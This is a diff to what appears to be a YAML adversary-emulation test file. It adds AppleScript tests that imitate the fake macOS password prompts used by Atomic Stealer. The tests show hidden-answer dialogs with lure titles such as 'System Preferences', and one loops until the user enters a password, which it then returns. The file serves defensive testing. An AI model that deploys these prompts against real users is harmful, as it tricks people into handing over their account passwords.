@@ -5,10 +5,32 @@ tests:
     references:
       - https://www.picussecurity.com/resource/blog/atomic-stealer-amos-macos-threat-analysis
     language: AppleScript
-    description: Removes a specified login item from the user's login items list. This can be used to clean up persistence mechanisms or remove unwanted autostart entries.
+    description: Displays a fake authentication dialog with a hidden answer field to trick the user into entering their macOS account password. Atomic Stealer (AMOS) uses this to harvest the login password.
     tcc_required: true
     command: |
       display dialog "#{description}" with title "#{title}" default answer "" with icon caution buttons {"Continue"} default button "Continue" with hidden answer
     args:
       title: "Auto-Updates System"
       description: "The launcher needs permissions to enable background auto-updates.Please enter your password."
+
+  - name: Loop password prompt until an answer is supplied
+    language: AppleScript
+    references:
+      - https://www.sentinelone.com/labs/atomic-stealer-threat-actor-spawns-second-variant-of-macos-malware-sold-on-telegram/
+      - https://www.elastic.co/security-labs/beyond-the-wail
+    description: Repeatedly presents a fake password dialog and refuses to dismiss it until a non-empty answer is entered, matching the Atomic Stealer behavior where the prompt pops until the user supplies a password. The captured value is returned rather than validated, so no shell is spawned.
+    tcc_required: true
+    command: |
+      set userPassword to ""
+      repeat until userPassword is not ""
+        try
+          set dialogResult to display dialog "#{prompt}" with title "#{title}" default answer "" with icon caution buttons {"OK"} default button "OK" with hidden answer
+          set userPassword to text returned of dialogResult
+        on error
+          set userPassword to ""
+        end try
+      end repeat
+      return userPassword
+    args:
+      title: "System Preferences"
+      prompt: "MacOS wants to access System Preferences. Please enter your password."
